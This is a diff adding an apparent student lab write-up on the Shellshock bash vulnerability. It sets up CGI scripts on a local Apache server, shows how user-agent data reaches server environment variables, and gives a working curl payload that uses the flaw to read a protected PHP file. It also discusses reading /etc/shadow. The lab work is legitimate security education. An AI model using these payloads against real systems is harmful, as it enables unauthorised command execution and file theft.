@@ -1,0 +1,93 @@
+1)
+
+First, we need to create the file myprog.cgi in "/Desktop", with the following content:
+
+-------------------------------
+#!/bin/bash_shellshock
+echo "Content-type: text/plain"
+echo
+echo
+echo "Hello World"
+-------------------------------
+
+Then, in the terminal:
+
+$ cd ~/Desktop
+$ sudo cp *.cgi /usr/lib/cgi-bin/
+$ cd ~/usr/lib/cgi-bin/
+$ sudo chmod 755 myprog.cgi
+
+We used the previous 4 commands to copy file myprog.cgi to the directory 
+"/usr/lib/cgi-bin" (the default CGI directory for the Apache web server)
+As we are using the same machine for both the attacker and the server,
+we ran the following command to make a request:
+
+$ curl http://localhost/cgi-bin/myprog.cgi
+
+The server returns an "Hello World".
+
+################################################################################
+
+2)
+
+Now we need to create the file myprog2.cgi, also in "/Desktop", but with the 
+following content:
+
+------------------------------------------
+#!/bin/bash_shellshock
+echo "Content-type: text/plain"
+echo
+echo "****** Environment Variables ******"
+strings /proc/$$/environ
+------------------------------------------
+
+Repeating the previous steps for this new file, when we run the following
+command, the server returns its environment variables.
+
+$ curl http://localhost/cgi-bin/myprog2.cgi
+
+To pass user data to the server environment, we have to use -A agent field:
+
+$ curl -A "User data in server environment variable" http://localhost/cgi-bin/myprog2.cgi
+
+The server now returns the environment variable HTTP_USER_AGENT as "User data
+in server environment variable" (the String written by the user). We have successfully 
+injected data into the server environmnet.
+
+################################################################################
+
+3)
+
+We created two VMs that share the same network so we can communicate between them. After setting them up, we used the command 'ifconfig' to obtain their ip address in the network. Once knowing each ip, we used the command 'ping <ip>' to check the connection with the other VM.
+
+To steal content from secret server files (files that are not accessible to remote 
+users), we need to tweak the -A string a little bit. We want to view the contents
+of a file, meaning we will use the 'cat' command. The target file will be 
+'var/www/SQLInjection/safe_home.php'.
+
+We will use the vulnerable function format in the user agent field:
+'curl -A "() {statement;}; <vulnerable commands>;" <url>'.
+
+To execute the vulnerable commands, we will use CGI program format, meaning
+'<vulnerable commands>' becomes 'echo Content-type: text/plain; echo; <commands>'.
+
+So, the resulting statement is as follows:
+
+$ curl -A "() { echo HelloWorld; }; echo Content-type: text/plain; echo; /bin/cat /var/www/SQLInjection/safe_home.php" http://localhost/cgi-bin/myprog2.cgi
+
+The server returns the content in 'safe_home.php'.
+
+################################################################################
+
+4)
+
+We cannot steal content from the '/etc/shadow' file, since it requires root
+privileges and the Apache web server runs through a user account that isn't
+the root.
+
+
+
+
+
+
+
